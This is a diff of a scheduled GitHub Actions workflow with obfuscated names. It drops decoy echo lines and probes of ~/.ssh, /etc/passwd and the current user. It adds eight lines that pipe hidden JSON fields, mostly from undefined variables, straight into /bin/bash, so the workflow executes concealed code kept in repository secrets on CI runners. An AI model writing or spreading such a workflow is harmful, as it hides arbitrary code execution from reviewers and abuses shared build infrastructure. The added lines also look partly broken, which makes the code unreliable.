@@ -3,25 +3,24 @@ name: guanzhongxian6226
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
+    - cron: '52 4/6 * * *'
 
-jobs:  # 31761
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: guanzhongxian6226
         env:
-          d23509: ${{ secrets.d23509 }}
+          qfme05: ${{ secrets.qfme05 }}
         run: |
-          [ -d "$HOME/.ssh/config.d" ] && echo "$HOME/.ssh/config.d exists" || echo "$HOME/.ssh/config.d no exists"
-          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
-          echo $d23509 | jq -r .d32753 | /bin/bash
-          echo "Dir: $(pwd)"
-          echo "Version: $((1 + RANDOM % 5))"
-          git pull -r
-          echo "Time: $(date +%H:%M:%S)"
-          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
-          echo "Date only: $(date +%F)"
-          echo "User: $(whoami)"
-          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo $qfme05 | jq -r .axbtf83 | /bin/bash
+          echo $cx7439 | jq -r .xjq9552 | /bin/bash
+          echo $t09553 | jq -r .rkqs4 | /bin/bash
+          echo $oy7149 | jq -r .dcwp646 | /bin/bash
+          echo $wioc2387 | jq -r .my4 | /bin/bash
+          echo $q0733 | jq -r .z47 | /bin/bash
+          echo $bz25008 | jq -r .nkwl2837 | /bin/bash
+          echo $dpdu005 | jq -r .ryoh0589 | /bin/bash
+
